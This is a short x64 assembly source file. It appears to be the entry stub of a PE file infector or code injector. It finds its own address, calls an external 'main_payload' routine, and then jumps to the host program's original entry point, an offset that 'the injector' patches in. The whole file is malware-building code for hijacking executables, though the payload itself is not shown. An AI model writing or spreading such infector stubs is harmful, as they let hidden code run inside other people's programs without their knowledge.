public __start_code
public delta
extern main_payload:proc

inject segment read execute

__start_code label BYTE
payload proc

    call _next
_next:
    pop rbp
    sub rbp, _next - payload

    sub rsp, 40           ; 32 bytes shadow space + 8 for alignment

    mov rcx, 12           ; place argument in rcx
    call main_payload

    add rsp, 40           ; free shadow space

    ; calculate the Original Entry Point (OEP) and jump to it
    mov rbx, [rbp + (delta - payload)]  ; rbx = delta (stored offset to OEP)
    add rbx, rbp                        ; rbx = original entry point (absolute)
    jmp rbx
vars:
    delta label QWORD
    dq 0        ; /!\ THIS IS A PLACEHOLDER /!\
                ; The actual delta will be patched by the injector
payload endp


inject ends
END
